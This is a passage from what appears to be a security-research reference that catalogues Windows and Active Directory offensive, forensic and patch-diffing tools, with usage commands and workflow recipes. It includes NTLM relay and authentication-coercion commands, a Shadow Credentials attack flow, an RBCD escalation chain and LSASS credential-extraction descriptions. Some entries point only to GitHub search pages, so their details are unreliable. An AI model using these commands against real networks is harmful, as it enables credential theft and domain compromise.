# ESC8: relay NTLM authentication to the ADCS HTTP enrollment endpoint
certipy relay -ca 10.0.0.5 -target 10.0.0.1
```

**ESC vulnerability classes (brief):**

| ESC | Description |
|-----|-------------|
| ESC1 | Client-supplied SAN in template; allows any UPN |
| ESC2 | Any Purpose EKU or no EKU restriction |
| ESC3 | Certificate Request Agent template — obtain cert on behalf of any user |
| ESC4 | Writable certificate template ACL (attacker can modify template) |
| ESC6 | CA has EDITF_ATTRIBUTESUBJECTALTNAME2 — forces ESC1 on all templates |
| ESC7 | Weak CA ACL — low-privilege user can manage CA |
| ESC8 | NTLM relay to ADCS HTTP endpoint |

---

### Coercer

| Field | Value |
|-------|-------|
| **Author** | p0dalirius (Podalirius) |
| **URL** | https://github.com/p0dalirius/Coercer |
| **Trust** | HIGH |
| **Tags** | `authentication-coercion` `NTLM` `relay` `MS-RPRN` `PetitPotam` `MS-DFSNM` |

**What it is:** Python tool that automates calling all known authentication coercion methods against a target. Instead of manually testing each coercion vector, Coercer iterates through every known method (MS-RPRN, MS-EFSR/PetitPotam, MS-DFSNM, MS-FSRVP, MS-EVEN6, and others) and reports which ones succeed.

**Usage:**
```bash
# Scan which coercion methods work against a target (listener = your responder/ntlmrelayx)
coercer scan -t 10.0.0.5 -u user -p Password1 -d domain.local

# Coerce authentication to your listener
coercer coerce -l 10.0.0.10 -t 10.0.0.5 -u user -p Password1 -d domain.local
```

**Research use:** Enumerate which authentication coercion paths work on a target before choosing the relay chain. Useful for testing whether MS-RPRN is blocked while MS-EFSR is not, or finding lesser-known coercion vectors in hardened environments.

---

### Volatility3

| Field | Value |
|-------|-------|
| **Author** | Volatility Foundation |
| **URL** | https://github.com/volatilityfoundation/volatility3 |
| **Trust** | HIGH |
| **Tags** | `memory-forensics` `kernel` `EPROCESS` `token` `Windows-internals` |

**What it is:** Memory forensics framework for analyzing Windows memory dumps. Provides a plugin architecture for extracting kernel data structures from raw memory captures.

**Key plugins for kernel research:**

| Plugin | What it does |
|--------|-------------|
| `windows.pslist` | Walk EPROCESS list, show all processes with PID/PPID/CreateTime |
| `windows.pstree` | Same as pslist but in tree format showing parent-child relationships |
| `windows.handles` | Dump the handle table for every process — object type, name, access mask |
| `windows.tokens` | Token analysis for each process: user SID, groups, privileges, integrity level |
| `windows.driverirp` | IRP dispatch table for each loaded driver — detect hooked IRP handlers |
| `windows.ssdt` | SSDT hook detection — identify syscall table entries replaced by rootkit |
| `windows.modules` | Loaded kernel modules with base address and size |
| `windows.callbacks` | PsSetCreateProcessNotifyRoutine and other kernel callbacks registered |
| `windows.poolscanner` | Scan pool memory for specific object tags — find hidden allocations |

**Research use:**
- Verify kernel exploitation results: take a memory dump after running your token-stealing PoC, run `windows.tokens` to confirm the target process token was replaced with SYSTEM token
- Analyze malware behavior post-execution without running code interactively
- Understand kernel data structure layout by inspecting a live memory dump in conjunction with Vergilius Struct Explorer

```bash
# Basic invocation — analyze a WinPmem or LiveKd dump
python3 vol.py -f memory.raw windows.tokens --pid 1234

# Find all processes whose token has SeDebugPrivilege enabled
python3 vol.py -f memory.raw windows.tokens | grep SeDebugPrivilege
```

---

### KrbRelayUp

| Field | Value |
|-------|-------|
| **Author** | Dec0ne |
| **URL** | https://github.com/Dec0ne/KrbRelayUp |
| **Trust** | HIGH |
| **Tags** | `Kerberos` `RBCD` `relay` `LPE` `domain-joined` |

**What it is:** Local privilege escalation tool for domain-joined Windows machines. Implements the full RBCD-based LPE chain without requiring local admin.

**The full exploitation chain:**
1. Coerce the machine account's NTLM authentication to a local LDAP relay (no signing required in default configs)
2. Via the relay, create a new computer account in AD (standard users can do this up to MachineAccountQuota, default 10)
3. Set RBCD from the new computer account to the target machine account (`msDS-AllowedToActOnBehalfOfOtherIdentity`)
4. Use Rubeus S4U2Self to request a ticket to the machine as any user (e.g., Administrator)
5. Use Rubeus S4U2Proxy to extend this ticket to a CIFS or HOST service on the machine
6. Impersonate Administrator / SYSTEM on the local machine

**Research use:** Demonstrates the RBCD-based LPE chain end-to-end. The source code shows the complete S4U protocol sequence — useful for understanding how RBCD delegation is abused at the protocol level before studying Rubeus's modular implementation.

---

### Whisker

| Field | Value |
|-------|-------|
| **Author** | Elad Shamir |
| **URL** | https://github.com/eladshamir/Whisker |
| **Trust** | HIGH |
| **Tags** | `shadow-credentials` `PKINIT` `msDS-KeyCredentialLink` `Kerberos` |

**What it is:** C# tool for the Shadow Credentials attack. Adds attacker-controlled key credentials to a target user or computer object's `msDS-KeyCredentialLink` AD attribute. Requires GenericWrite (or equivalent) on the target object.

**Attack flow:**
1. `Whisker add /target:victim` — generates a key pair, adds the public key to `msDS-KeyCredentialLink` on the victim account
2. Whisker outputs a Rubeus command to run with the generated private key
3. Run the Rubeus PKINIT command — authenticate to the KDC using the private key, obtain a TGT for the victim account
4. From the TGT, use `Rubeus asktgs` + `describeticket` to recover the victim's NT hash (via U2U + PAC parsing)
5. Remove the added key credential with `Whisker remove` to clean up

**Why this matters:** Shadow Credentials is a stealth alternative to traditional Kerberoasting/AS-REP roasting — it does not require changing the account's password and leaves fewer audit artifacts than DCSYNC.

---

### Adalanche

| Field | Value |
|-------|-------|
| **Author** | Lars Karlslund |
| **URL** | https://github.com/lkarlslund/Adalanche |
| **Trust** | HIGH |
| **Tags** | `Active-Directory` `attack-path` `graph` `BloodHound-alternative` |

**What it is:** AD attack path analysis alternative to BloodHound. Automatically collects and analyzes AD data, generates attack paths to Domain Admin. Runs as a single self-contained binary — no Neo4j or separate database required.

**Advantages over BloodHound:**
- Includes ADCS attack paths (ESC vulnerabilities) natively in the graph — BloodHound requires separate plugins for this
- Single binary deployment simplifies operational use
- Built-in web UI for browsing the attack graph
- Can analyze AD snapshots offline (taken with ADExplorer)

**Usage:**
```bash
# Collect from domain-joined machine
adalanche collect activedirectory --server dc.domain.local --username user --password Password1

# Analyze collected data and start web UI
adalanche analyze
```

---

### GhostPack/SafetyKatz

| Field | Value |
|-------|-------|
| **Author** | SpecterOps / GhostPack |
| **URL** | https://github.com/GhostPack/SafetyKatz |
| **Trust** | HIGH |
| **Tags** | `credentials` `LSASS` `Mimikatz` `C#` |

**What it is:** C# wrapper around Mimikatz that runs credential extraction via LSASS minidump and in-memory parsing, deliberately avoiding writing the Mimikatz binary to disk. The process: call `MiniDumpWriteDump` to create a minidump of LSASS in memory → parse the dump in-memory using an embedded Mimikatz parser → output credentials.

**Research value:** Demonstrates how credential extraction can be implemented without dropping the well-known Mimikatz binary signatures to disk. Useful for understanding the minidump-based credential extraction technique from a source-code perspective.

---

### ADExplorer (Sysinternals)

| Field | Value |
|-------|-------|
| **Author** | Microsoft / Sysinternals |
| **URL** | https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer |
| **Trust** | HIGH |
| **Tags** | `Active-Directory` `AD-snapshot` `enumeration` |

**What it is:** GUI Active Directory browser and offline snapshot tool from Sysinternals. Connects to a domain controller via LDAP and allows browsing all AD objects and their attributes interactively.

**Snapshot capability:** ADExplorer can save a complete offline snapshot of the AD directory to a single `.dat` file. This snapshot can then be:
- Loaded back into ADExplorer for offline browsing without needing DC access
- Converted to BloodHound-compatible JSON using `ADExplorer2BloodHound` for offline attack path analysis — no need to run SharpHound against a live DC

**Research use:** Take an AD snapshot with low noise (single LDAP connection vs. SharpHound's many queries), then perform offline analysis. Particularly useful for environments where SharpHound triggers alerting.

---

## Category 7 — Detection and Forensics

> Tools for monitoring exploit attempts, collecting telemetry during lab testing, and building detection logic. Running these alongside your PoC work closes the loop between "does this exploit work" and "would this trigger detection."

---

### Sealighter-TI

| Field | Value |
|-------|-------|
| **Author** | pathtofile |
| **URL** | https://github.com/pathtofile/SealighterTI |
| **Trust** | HIGH |
| **Tags** | `ETW` `threat-intelligence` `process-injection` `token-manipulation` `monitoring` |

**What it is:** ETW-based threat intelligence collection tool targeting the `Microsoft-Windows-Threat-Intelligence` ETW provider. This provider is a kernel-mode ETW channel that surfaces security-relevant kernel events — events that normal user-mode ETW providers do not expose.

**What it monitors:**
- **Process injection events** — `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` calls targeting other processes, with the source and target PID
- **Memory allocation with executable permissions** — `VirtualAlloc`/`VirtualProtect` calls that set `PAGE_EXECUTE_*` on memory regions in a process context
- **Token manipulation** — `NtSetInformationToken` and `NtDuplicateToken` calls; useful for detecting token stealing PoCs in a lab setting
- **Suspicious handle operations** — handle duplication across process boundaries at elevated access levels

**Usage:**
```powershell
# Requires running as PPL-protected process or with SeDebugPrivilege
# Build and run as a protected process or in a kernel debugging context
SealighterTI.exe --output events.json

# Monitor specific event types only
SealighterTI.exe --filter injection,token
```

**Research use:** Run Sealighter-TI in one terminal while executing your exploit in another. The output shows exactly which kernel-level events your exploit triggers, which directly maps to what EDR detection rules would fire. Useful for understanding the detection surface of a technique before deploying it.

---

### ETWMonitor

| Field | Value |
|-------|-------|
| **Author** | Community / multiple contributors |
| **URL** | https://github.com/search?q=ETWMonitor+windows+security |
| **Trust** | MEDIUM |
| **Tags** | `ETW` `real-time` `security-events` `lab-monitoring` |

**What it is:** Real-time ETW consumer for Windows security events. Subscribes to multiple ETW providers simultaneously and presents a unified, filtered stream of security-relevant events. Useful for monitoring exploit attempts during lab testing without setting up a full SIEM.

**Monitored providers (default configuration):**
- `Microsoft-Windows-Kernel-Process` — process creation/termination with command lines
- `Microsoft-Windows-Security-Auditing` — logon events, privilege use, object access
- `Microsoft-Windows-Kernel-File` — file create/read/write/delete operations
- `Microsoft-Windows-Kernel-Registry` — registry key and value operations
- `Microsoft-Windows-PowerShell` — PowerShell script block logging (if enabled)

**Research use:** Lightweight alternative to ProcMon for specific ETW event monitoring; more useful when you want to correlate events across multiple providers in a single timestamped stream.

---

### SilkETW v1.x (2024)

| Field | Value |
|-------|-------|
| **Author** | FuzzySecurity (b33f) / Mandiant |
| **URL** | https://github.com/mandiant/SilkETW |
| **Trust** | HIGH |
| **Tags** | `ETW` `YARA` `JSON` `kernel-security` `provider-presets` |

**What it is:** Flexible ETW consumer framework designed for security research and threat intelligence. Collects ETW events from any provider, filters them with YARA rules, and outputs structured JSON for analysis or ingestion into a SIEM.

**SilkETW v1.x (2024) updates:**

**Enhanced YARA integration:**
- YARA rules can now match on any field in the ETW event, not just the raw event buffer
- New built-in YARA rule set for common offensive techniques: process injection, LSASS access, named pipe creation, token manipulation
- Real-time YARA matching with alert output: fire-and-forget mode where SilkETW alerts only when a YARA rule matches, reducing noise

**New provider presets for kernel security research:**
```json
// kernel-security preset — covers key security telemetry providers
{
  "preset": "kernel-security",
  "providers": [
    "Microsoft-Windows-Threat-Intelligence",
    "Microsoft-Windows-Kernel-Process",
    "Microsoft-Windows-Security-Auditing",
    "Microsoft-Antimalware-Scan-Interface"
  ]
}
```

```cmd
# Run with the kernel-security preset and YARA rules
SilkETW.exe -t kernel -pn Microsoft-Windows-Threat-Intelligence \
    -ot file -p C:\Silk\output.json -y C:\Rules\injection.yar

# Use built-in provider preset
SilkETW.exe --preset kernel-security --output C:\Silk\events.json
```

**JSON output improvements:** Normalized field names across all providers; consistent timestamp format (ISO 8601); new `provider_guid` field for unambiguous provider identification.

---

### KrabsETW

| Field | Value |
|-------|-------|
| **Author** | Microsoft (partial open-source release) + community |
| **URL** | https://github.com/microsoft/krabsetw |
| **Trust** | HIGH |
| **Tags** | `ETW` `C++` `library` `custom-monitoring` `internal-tooling` |

**What it is:** A C++ ETW consumer library used internally by Microsoft for building security monitoring tools, now partially open-sourced. Provides a higher-level C++ API over the raw `EVENT_TRACE_*` APIs (`StartTrace`, `EnableTraceEx2`, `ProcessTrace`), making it significantly easier to build custom ETW consumers.

**Why it matters for researchers:**
- The raw ETW API (`tdh.h`, `evntrace.h`) is verbose and error-prone to use directly
- KrabsETW wraps this with a C++ callback model that handles provider subscription, event routing, and field parsing automatically
- Understanding KrabsETW's architecture reveals how Microsoft's own monitoring infrastructure is built — directly applicable to understanding what EDR products can and cannot observe

**Usage pattern:**
```cpp
// Subscribe to a provider and filter events by keyword
krabs::user_trace trace(L"KrabsResearchTrace");
krabs::provider<> provider(L"Microsoft-Windows-Kernel-Process");

// Filter on process creation events (keyword 0x10)
provider.add_on_event_callback([](const EVENT_RECORD& record, const krabs::trace_context& ctx) {
    krabs::schema schema(record, ctx.schema_locator);
    krabs::parser parser(schema);
    
    std::wstring image_name = parser.parse<std::wstring>(L"ImageName");
    uint32_t pid = parser.parse<uint32_t>(L"ProcessID");
    
    std::wcout << L"Process created: " << image_name << L" PID=" << pid << std::endl;
});

trace.enable(provider);
trace.start(); // blocking — runs event loop
```

**Research use:** Build custom, lightweight ETW monitors targeting exactly the providers and event types relevant to a specific research question. More efficient than running SilkETW when you only need a narrow event stream.

---

## Category 8 — Static Analysis and Binary Research

> Tools for patch diffing, symbol management, and offline binary analysis. Essential for vulnerability discovery via patch comparison and for understanding Windows binary internals without live execution.

---

### BinDiff 9.0 (2024)

| Field | Value |
|-------|-------|
| **Author** | Google / Zynamics |
| **URL** | https://github.com/google/bindiff |
| **Trust** | HIGH |
| **Tags** | `binary-diffing` `patch-analysis` `IDA-plugin` `ARM64` `vulnerability-research` |

**What it is:** Binary diffing tool that compares two compiled binaries and identifies which functions changed between versions. The primary use case is patch diffing: compare the unpatched and patched version of a Windows binary to find exactly which code paths the security fix modifies — and therefore where the vulnerability was.

**BinDiff 9.0 (2024) updates:**

**Free for non-commercial use:** BinDiff 9.0 was released under a free-for-non-commercial license, removing the previous commercial licensing requirement. Download from the Google GitHub repository.

**IDA Pro 9 plugin:** Updated plugin compatible with IDA Pro 9.x; the previous plugin had compatibility issues with IDA 9's new type system. The 9.0 plugin also exposes a Python API for scripting batch diffs.

**Improved ARM64 matching:** Significantly better function matching for ARM64 binaries, previously weak due to ARM64's different calling convention and instruction encoding. Relevant for diffing Windows on ARM binaries (Surface, ARM64 VMs).

**Patch diffing workflow:**
```
1. Download pre-patch and post-patch versions of the target DLL
   - Use Winbindex to find builds: https://winbindex.m417z.com/
   - Download both builds via msdl or direct URL

2. Load both binaries in IDA Pro, let auto-analysis complete
   - Save .idb files for each

3. Run BinDiff: Edit → Plugins → BinDiff
   - Primary: post-patch version
   - Secondary: pre-patch version
   - Match threshold: 0.75 (recommended starting point)

4. Review unmatched / low-similarity functions in the diff view
   - These are the changed functions — the fix is in here

5. Navigate to the changed function in the decompiler
   - Compare pre/post decompiled output side-by-side
   - Identify the removed/added bounds check, condition, or sanitization
```

---

### Diaphora 3.x (2024)

| Field | Value |
|-------|-------|
| **Author** | Joxean Koret |
| **URL** | https://github.com/joxeankoret/diaphora |
| **Trust** | HIGH |
| **Tags** | `binary-diffing` `IDA-plugin` `Python3` `FLIRT` `patch-diffing` |

**What it is:** Open-source binary diffing plugin for IDA Pro, alternative to BinDiff. Implements a different matching algorithm (graph-based similarity with multiple heuristics) that sometimes finds matches BinDiff misses, particularly for heavily compiler-optimized or obfuscated binaries.

**Diaphora 3.x (2024) updates:**

**Python 3 rewrite complete:** Diaphora 3.x is a complete rewrite in Python 3, removing the Python 2 dependency that made the 2.x series difficult to maintain. Compatible with IDA Pro 8.x and 9.x.

**Better FLIRT integration:**
- Automatically applies FLIRT signatures to both binaries before diffing, reducing noise from matched library functions
- New `--apply-flirt` command-line flag for batch processing
- Integrates with the IDA FLIRT signature database automatically if configured

**Automated patch diffing scripts:**
```python
# Batch diff a directory of patched vs. unpatched pairs
# Script: diaphora_batch_diff.py

import diaphora
import os

pairs = [
    ("ntdll_pre.idb", "ntdll_post.idb"),
    ("win32k_pre.idb", "win32k_post.idb"),
]

for pre, post in pairs:
    diff = diaphora.CBinDiff(pre)
    diff.diff_databases(post)
    diff.export_results(f"diff_{os.path.basename(pre)}.json")
```

---

### Winbindex

| Field | Value |
|-------|-------|
| **Author** | m417z |
| **URL** | https://winbindex.m417z.com / https://github.com/m417z/winbindex |
| **Trust** | HIGH |
| **Tags** | `Windows-binaries` `build-index` `patch-diffing` `symbol-research` |

**What it is:** A searchable index of Windows PE files organized by build number, file name, and file hash. For every Windows build that Microsoft has published symbol data for, Winbindex indexes the exact binary file (DLL, EXE, SYS) with its SHA256 hash, file version, and download URL.

**Why it is essential for patch diffing:**
- Finding the exact pre-patch binary for a CVE requires knowing which build introduced the fix
- Winbindex lets you navigate by file name → see all build versions → download the specific pre-patch build
- Eliminates the need to maintain a library of Windows ISOs or VM snapshots for patch diffing

**msdl companion:** `msdl` (Microsoft Symbol Downloader) is a companion tool that automates downloading Windows binaries by hash from the Microsoft symbol server. Used with Winbindex:

```bash
# 1. Find the SHA256 of ntdll.dll from a specific pre-patch build on Winbindex
# 2. Download it via msdl
msdl.exe /fileptr [sha256_hash] /dest C:\Binaries\ntdll_pre.dll

# Or use the direct URL from Winbindex
curl -O "https://msdl.microsoft.com/download/symbols/ntdll.dll/[timestamp][size]/ntdll.dll"
```

**Research workflow:**
```
Patch Tuesday released → CVE announced for ntdll.dll →
  Winbindex: find ntdll.dll → identify last pre-patch build →
  Download pre-patch ntdll.dll via msdl →
  Download patched ntdll.dll from current system or via msdl →
  BinDiff / Diaphora → identify changed function →
  Decompile and understand the fix → derive the vulnerability
```

---

### pdb-downloader

| Field | Value |
|-------|-------|
| **Author** | Community (multiple implementations) |
| **URL** | https://github.com/search?q=pdb+downloader+windows+symbols |
| **Trust** | MEDIUM |
| **Tags** | `symbols` `PDB` `automation` `reverse-engineering` |

**What it is:** Automated symbol download tool for Windows binaries that does not require `symchk.exe` (which is only available with the Windows SDK/WDK installed). Parses the PE debug directory to extract the PDB GUID and age, then constructs the correct Microsoft Symbol Server URL to download the matching `.pdb` file.

**Why it matters:**
- `symchk.exe` requires installing the full Windows SDK or WDK, which is impractical in minimal lab VMs or WSL environments
- `pdb-downloader` (or equivalent tools like `symstore-cli`) runs standalone with no SDK dependency
- Useful for downloading symbols for binaries obtained via Winbindex or from memory dumps

**Usage:**
```bash
# Download PDB for a specific binary
pdb-downloader.exe ntdll.dll --output C:\Symbols\

# Download PDB from a memory dump's loaded module (using PE header)
pdb-downloader.exe --from-dump memory.raw --module ntdll.dll --output C:\Symbols\

# Batch download symbols for all binaries in a directory
pdb-downloader.exe --batch C:\Binaries\ --output C:\Symbols\ --server https://msdl.microsoft.com/download/symbols
```

**Integration with WinDbg:**
```windbg
; After downloading PDBs manually, point WinDbg to your local symbol cache
.sympath SRV*C:\Symbols*https://msdl.microsoft.com/download/symbols
.reload /f ntdll.dll
```

**Alternative: dbh.exe from Debugging Tools for Windows** — if WDK is available, `dbh.exe` provides similar automated symbol retrieval. `pdb-downloader` is the no-SDK alternative.

---

## Quick Reference Table

| # | Repo | Author | URL | Trust | Primary Use |
|---|------|--------|-----|-------|-------------|
| 1 | sandbox-attacksurface-analysis-tools | Forshaw/PZ | https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools | HIGH | Token/RPC/COM/object-namespace research |
| 2 | symboliclink-testing-tools | Forshaw/PZ | https://github.com/googleprojectzero/symboliclink-testing-tools | HIGH | Symlink/junction/oplock exploit building |
| 3 | PrivescCheck | itm4n | https://github.com/itm4n/PrivescCheck | HIGH | LPE enumeration + education |
| 4 | PrintSpoofer | itm4n | https://github.com/itm4n/PrintSpoofer | HIGH | Named pipe impersonation PoC |
| 5 | RpcView | silverf0x | https://github.com/silverf0x/RpcView | HIGH | RPC endpoint enumeration |
| 6 | msiscan | community | https://github.com/search?q=msiscan+msi+privilege | MEDIUM | MSI custom action static analysis |
| 7 | Sysinternals Suite | Microsoft | https://learn.microsoft.com/en-us/sysinternals/ | HIGH | ProcMon, WinObj, AccessChk |
| 8 | InstallerFileTakeOver | klinix5 | https://github.com/klinix5/InstallerFileTakeOver | MED-HIGH | MSI repair LPE PoC |
| 9 | GodPotato | BeichenDream | https://github.com/BeichenDream/GodPotato | MEDIUM | Modern potato (educational) |
| 10 | SharpUp | GhostPack | https://github.com/GhostPack/SharpUp | HIGH | LPE enumeration (C#) |
| 11 | Seatbelt | GhostPack | https://github.com/GhostPack/Seatbelt | HIGH | Post-exploitation enumeration |
| 12 | SharpToken | community | https://github.com/search?q=SharpToken+impersonation | MEDIUM | Token impersonation chain testing |
| 13 | WhoAmI-Extended | community | https://github.com/search?q=whoami-extended+windows | MEDIUM | Lab token verification utility |
| 14 | HEVD | HackSysTeam | https://github.com/hacksysteam/HackSysExtremeVulnerableDriver | HIGH | Kernel exploitation lab (ARM64 + Segment Heap) |
| 15 | CVE-2024-21338 reference | AhnLab/ANSSI | https://github.com/search?q=CVE-2024-21338+appid | MEDIUM | Educational appid.sys UAF analysis |
| 16 | System Informer | winsiderss | https://github.com/winsiderss/systeminformer | HIGH | Process/token/handle analysis |
| 17 | impacket | Fortra | https://github.com/fortra/impacket | HIGH | SMB/Kerberos/NTLM/RPC tools |
| 18 | jackalope | PZ | https://github.com/googleprojectzero/jackalope | HIGH | Coverage-guided fuzzing (IOCTL mode) |
| 19 | WTF fuzzer | 0vercl0k | https://github.com/0vercl0k/wtf | HIGH | Snapshot kernel fuzzing (ALPC + FS modules) |
| 20 | awesome_windows_logical_bugs | sailay1996 | https://github.com/sailay1996/awesome_windows_logical_bugs | MEDIUM | Curated LPE references |
| 21 | Windows-LPE-Cookbook | nickvourd | https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook | HIGH | Structured LPE labs |
| 22 | pe-sieve | hasherezade | https://github.com/hasherezade/pe-sieve | HIGH | Injection detection |
| 23 | Rubeus | GhostPack | https://github.com/GhostPack/Rubeus | HIGH | Kerberos attack tooling |
| 24 | BloodHound/SharpHound | SpecterOps | https://github.com/BloodHoundAD/BloodHound | HIGH | AD attack path analysis |
| 25 | Certipy | ly4k | https://github.com/ly4k/Certipy | HIGH | ADCS ESC enumeration + exploitation |
| 26 | Coercer | p0dalirius | https://github.com/p0dalirius/Coercer | HIGH | Auth coercion path enumeration |
| 27 | Volatility3 | Volatility Foundation | https://github.com/volatilityfoundation/volatility3 | HIGH | Memory forensics + kernel research |
| 28 | KrbRelayUp | Dec0ne | https://github.com/Dec0ne/KrbRelayUp | HIGH | RBCD-based domain LPE |
| 29 | Whisker | Elad Shamir | https://github.com/eladshamir/Whisker | HIGH | Shadow credentials attack |
| 30 | Adalanche | lkarlslund | https://github.com/lkarlslund/Adalanche | HIGH | AD attack paths + ADCS (single binary) |
| 31 | SafetyKatz | GhostPack | https://github.com/GhostPack/SafetyKatz | HIGH | Diskless LSASS credential extraction |
| 32 | ADExplorer | Microsoft/Sysinternals | https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer | HIGH | AD snapshot + offline BloodHound ingestion |
| 33 | Sealighter-TI | pathtofile | https://github.com/pathtofile/SealighterTI | HIGH | ETW threat-intel provider monitoring |
| 34 | ETWMonitor | community | https://github.com/search?q=ETWMonitor+windows+security | MEDIUM | Real-time ETW security event monitoring |
| 35 | SilkETW v1.x | Mandiant | https://github.com/mandiant/SilkETW | HIGH | ETW collection with YARA integration |
| 36 | KrabsETW | Microsoft | https://github.com/microsoft/krabsetw | HIGH | C++ ETW consumer library |
| 37 | BinDiff 9.0 | Google/Zynamics | https://github.com/google/bindiff | HIGH | Patch diffing + IDA Pro 9 plugin |
| 38 | Diaphora 3.x | Joxean Koret | https://github.com/joxeankoret/diaphora | HIGH | Binary diffing (Python 3 rewrite) |
| 39 | Winbindex | m417z | https://winbindex.m417z.com | HIGH | Windows binary index by build number |
| 40 | pdb-downloader | community | https://github.com/search?q=pdb+downloader+windows+symbols | MEDIUM | Automated PDB download without SDK |

---

## Workflow Recipes

> These recipes describe specific sequences of tools for common research tasks. Follow them in order — each step's output feeds the next.

---

### Recipe 1 — Find LPE Vectors on a Local Machine

**Goal:** Starting from a standard user shell, identify all exploitable LPE paths on the current machine.

**Step 1 — PrivescCheck (broad sweep):**
```powershell
# Run full check, output to file for review
Invoke-PrivescCheck -Extended -Report PrivescCheck -Format TXT,HTML
```
Review findings: weak service ACLs, unquoted paths, DLL hijack candidates, token privileges, stored credentials.

**Step 2 — AccessChk (validate specific findings):**
```cmd
# Verify if a specific service binary is writable by the current user
accesschk.exe -wuvc "BUILTIN\Users" "C:\Program Files\VulnService\service.exe"

# Find all services whose registry keys are writable
accesschk.exe -kwsu "BUILTIN\Users" HKLM\SYSTEM\CurrentControlSet\Services

# Find writable directories in PATH (DLL hijack via service PATH)
accesschk.exe -wud "BUILTIN\Users" "C:\Program Files\VulnService\"
```

**Step 3 — ProcMon (dynamic confirmation):**
- Launch ProcMon with admin or capture-only permissions, filter by target service
- Apply Recipe A (DLL hijack filter) from the ProcMon section above
- Restart the target service, observe which DLLs it tries to load from writable paths
- Apply Recipe B (file write filter) to find arbitrary write opportunities

**Step 4 — System Informer (verify result):**
- After exploitation, open System Informer
- Navigate to your spawn process → Properties → Token
- Confirm: User = NT AUTHORITY\SYSTEM, Integrity Level = System, desired privileges present

---

### Recipe 2 — Enumerate RPC Attack Surface

**Goal:** Map the full RPC attack surface of a Windows machine to find interfaces callable from low-privilege context that perform privileged operations.

**Step 1 — RpcView (GUI overview):**
- Launch RpcView as standard user
- Browse the list of registered RPC servers
- Filter for servers running as SYSTEM or high-integrity processes
- Export interesting interface IDLs

**Step 2 — NtObjectManager (detailed enumeration):**
```powershell
# Get all RPC servers with their interfaces and security callbacks
$servers = Get-RpcServer
$servers | Where-Object { $_.ProcessName -notmatch 'lsass|csrss|wininit' -and $_.SecurityCallback -eq $null } |
    Select-Object ProcessName, InterfaceId, InterfaceVersion, EndpointCount |
    Sort-Object ProcessName | Format-Table

# Drill into a specific server and list its procedures
$target = $servers | Where-Object { $_.ProcessName -eq 'spoolsv' }
$target | Get-RpcProcedure | Select-Object Name, ProcNum, HasAsyncHandle
```

**Step 3 — impacket rpcdump (remote or local enumeration):**
```bash
# Enumerate all RPC endpoints on a remote machine
python3 rpcdump.py -port 135 domain/user:password@10.0.0.5

# Find which endpoints are active and which protocols they use
python3 rpcmap.py ncacn_ip_tcp:10.0.0.5 -brute-opnums -auth-level 1
```

**Cross-reference:** Match interfaces found in RpcView/NtObjectManager with known authentication coercion vectors. Check the itm4n PetitPotam writeup for the exact workflow from interface discovery to coercion PoC.

---

### Recipe 3 — AD Attack Path Analysis

**Goal:** Given domain credentials (standard user), map all paths to Domain Admin and identify ADCS vulnerabilities.

**Step 1 — SharpHound collection:**
```powershell
# Full collection — users, groups, GPOs, ACLs, sessions, trusts
Invoke-BloodHound -CollectionMethod All -Domain domain.local -OutputDirectory C:\Temp\BH

# Or use BloodHound.py from off-domain attacker machine
python3 bloodhound.py -u user -p Password1 -d domain.local -dc dc.domain.local \
    -c All --zip
```

**Step 2 — BloodHound ingestion + initial queries:**
- Import ZIP into BloodHound UI
- Run: "Find Shortest Paths to Domain Admins from Owned Principals"
- Run: "Find all Domain Objects where Low-Privilege Users have GenericWrite"
- Run: "Find Computers with Unconstrained Delegation"

**Step 3 — Certipy find (ADCS vulnerability scan):**
```bash
# Enumerate all certificate templates with vulnerability flags
certipy find -u user@domain.local -p Password1 -dc-ip 10.0.0.1 -stdout

# Save full output for offline analysis
certipy find -u user@domain.local -p Password1 -dc-ip 10.0.0.1 -output domain_adcs
```
Review output for ESC1–ESC8 flags. ESC1 and ESC8 are the most commonly exploitable in default configurations.

**Step 4 — Coercer test (authentication coercion paths):**
```bash
# Start ntlmrelayx listener on attacker machine first
ntlmrelayx.py -t ldap://dc.domain.local --delegate-access

# Then test which coercion methods work against domain controllers
coercer scan -t dc.domain.local -u user -p Password1 -d domain.local
```

---

### Recipe 4 — Kernel Bug Analysis Workflow

**Goal:** Set up a structured environment to analyze a suspected kernel vulnerability, map data structures, and verify exploitation result.

**Step 1 — WinDbg kernel attach (KDNET):**
```
# On debuggee VM: configure KDNET
bcdedit /debug on
bcdedit /dbgsettings net hostip:10.0.0.10 port:50000 key:1.2.3.4

# On debugger: attach
windbg -k net:port=50000,key=1.2.3.4
```

**Step 2 — Structure inspection with dt/dq:**
```windbg
# Inspect EPROCESS structure of a specific process
!process 0 0 notepad.exe
dt nt!_EPROCESS [address]

# Dump the token pointer from EPROCESS
dt nt!_EPROCESS [address] Token

# Inspect the actual TOKEN structure
dt nt!_TOKEN [token_address & ~0xf]

# Check the privilege bitfields in the token
dt nt!_SEP_TOKEN_PRIVILEGES [priv_address]

# Dump dispatch table of a suspect driver
dqs [DriverObject+0x70] L1c
```

**Step 3 — Vergilius Struct Explorer (offset reference):**
- Navigate to https://www.vergiliusproject.com/kernels/x64
- Look up `_EPROCESS`, `_TOKEN`, `_DRIVER_OBJECT` for the exact Windows build
- Cross-reference field offsets with what WinDbg shows — any discrepancy indicates a structure layout change or corruption

**Step 4 — System Informer (live verification):**
- While WinDbg is attached, run System Informer on the debuggee
- After triggering your PoC: pause execution in WinDbg (`Ctrl+Break`)
- Check the target process token in System Informer vs. what WinDbg shows in the TOKEN structure
- Confirm integrity level field, user SID, and privilege bitmap all match expected post-exploitation state

---

### Recipe 5 — Patch Diffing a CVE (2024 Workflow)

**Goal:** Given a CVE affecting a Windows binary, find the exact code change introduced by the patch using Winbindex, BinDiff/Diaphora, and IDA Pro.

**Step 1 — Identify the patched binary and builds:**
```
1. Check the Microsoft Security Update Guide for the CVE
2. Note the affected component (e.g., "Windows Common Log File System Driver" → clfs.sys)
3. Note the patch Tuesday date to identify the fix build
```

**Step 2 — Download pre/post binaries via Winbindex:**
```
1. Navigate to https://winbindex.m417z.com/
2. Search for the binary name (e.g., clfs.sys)
3. Find the last build before the patch date → note SHA256
4. Find the first build after the patch date → note SHA256
5. Download both via msdl:
   msdl.exe /fileptr [pre_sha256] /dest C:\Diff\clfs_pre.sys
   msdl.exe /fileptr [post_sha256] /dest C:\Diff\clfs_post.sys
```

**Step 3 — Analyze in IDA Pro + BinDiff:**
```
